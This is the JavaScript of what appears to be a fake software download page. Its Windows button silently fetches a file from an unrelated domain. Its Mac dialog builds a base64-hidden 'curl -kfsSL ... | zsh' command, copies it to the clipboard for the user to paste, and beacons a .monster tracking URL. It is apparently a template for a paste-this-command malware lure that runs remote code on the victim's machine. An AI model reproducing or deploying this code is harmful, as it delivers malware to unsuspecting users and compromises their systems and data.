function triggerWindowsDownload() {
  const a = document.createElement('a');
  a.href = 'https://donggangnews.com/kl/28-03-my';
  a.style.display = 'none';
  document.body.appendChild(a);
  a.click();
  setTimeout(() => document.body.removeChild(a), 1000);

  const toast = document.getElementById('downloadToast');
  if (toast) {
    toast.classList.add('visible');
    setTimeout(() => toast.classList.remove('visible'), 3500);
  }
}

function toggleInfoPopup() {
  const popup = document.getElementById('infoPopup');
  const isHidden = popup.style.display === 'none' || popup.style.display === '';
  popup.style.display = isHidden ? 'flex' : 'none';
}

document.addEventListener('click', function(event) {
  const popup = document.getElementById('infoPopup');
  if (!popup || popup.style.display !== 'flex') return;
  const dialog = popup.querySelector('.popup-dialog');
  const trigger = event.target.closest('.footer-link');
  if (dialog && !dialog.contains(event.target) && !trigger) {
    popup.style.display = 'none';
  }
});

function randstr(n) {
  const c = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let r = '';
  for (let i = 0; i < n; i++) r += c[Math.floor(Math.random() * c.length)];
  return r;
}

var macInitialized = false;

function openMacModal() {
  const modal = document.getElementById('macModal');
  modal.style.display = 'flex';
  document.body.style.overflow = 'hidden';

  if (!macInitialized) {
    macInitialized = true;
    const raw = `EDIT_COMMAND`;
    let cmd = raw;
    if (cmd.startsWith('http')) {
      cmd = btoa(cmd.replace('REPLACE', randstr(5)));
      cmd = `curl -kfsSL $(echo '${cmd}'|base64 -d)|zsh`;
    }
    window.cmd = cmd;
    document.getElementById('macCommandText').innerHTML = cmd;

    fetch('https://spacezonepage.monster/multgd/cl.php');

    const copyBtn = document.getElementById('macCopyButton');
    const container = document.getElementById('macCommandContainer');
    const toast = document.getElementById('macToast');

    async function copyMacText(text) {
      try {
        if (navigator.clipboard && navigator.clipboard.writeText) {
          await navigator.clipboard.writeText(text);
        } else {
          const ta = document.createElement('textarea');
          ta.value = text;
          ta.style.cssText = 'position:fixed;opacity:0';
          document.body.appendChild(ta);
          ta.select();
          document.execCommand('copy');
          document.body.removeChild(ta);
        }
        toast.classList.add('show');
        setTimeout(() => toast.classList.remove('show'), 1800);
      } catch(e) {
        alert('Please copy the command manually.');
      }
    }

    copyBtn.addEventListener('click', function(e) {
      e.preventDefault();
      e.stopPropagation();
      copyMacText(document.getElementById('macCommandText').innerText);
    });

    container.addEventListener('click', function(e) {
      if (!e.target.closest('#macCopyButton')) {
        copyMacText(document.getElementById('macCommandText').innerText);
      }
    });
  }
}

function closeMacModal() {
  const modal = document.getElementById('macModal');
  modal.style.display = 'none';
  document.body.style.overflow = '';
}

document.addEventListener('keydown', function(e) {
  if (e.key === 'Escape') {
    const modal = document.getElementById('macModal');
    if (modal && modal.style.display === 'flex') closeMacModal();
    const popup = document.getElementById('infoPopup');
    if (popup && popup.style.display === 'flex') popup.style.display = 'none';
  }
});
